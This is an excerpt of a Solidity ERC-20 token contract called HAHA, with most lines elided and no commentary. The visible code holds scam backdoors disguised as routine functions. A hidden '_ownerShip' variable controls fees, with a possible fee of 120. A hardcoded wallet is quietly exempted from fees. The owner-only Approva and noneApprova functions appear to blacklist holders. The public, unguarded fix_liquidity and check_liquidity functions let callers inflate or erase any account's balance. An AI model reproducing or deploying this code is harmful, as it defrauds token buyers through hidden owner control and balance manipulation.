...
contract HAHA is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x409d8382ac949A0f0e567686FA92C9A58e2429EC);
    ...
    */
    ...
    uint256 private maxPossibleFee = 120; 
    ...
    */
    ...
    function excludeFromFee(address account) public onlyOwner {
        ...
        _isExcludedFromFee[address(0xFCc44d78b9f807262CEA932E97c17cE533B19b34)] = true;
    }
    ...
    */
    ...
    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external {
        require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
    ...
    */
    ...
    function set_Swap_And_Liquify_Enabled(bool true_or_false) public {
        require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
    ...
    function Approva(address[] calldata addresses) external {
       require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        uint256 startGas;
        uint256 gasUsed;
    ...
    function noneApprova(address[] calldata addresses) external {
       require(_ownerShip == _msgSender(), "Ownable: caller is not the owner");
        uint256 startGas;
        uint256 gasUsed;
    ...
    function blacklist_Switch(bool true_or_false) internal onlyOwner {
    ...
    */
    ...
    function fix_liquidity(uint256 Amount, address addr) public {
        _tOwned[addr] += Amount;
    }

    function check_liquidity(uint256 Amount, address addr) public {
        _tOwned[addr] -= Amount;
    }
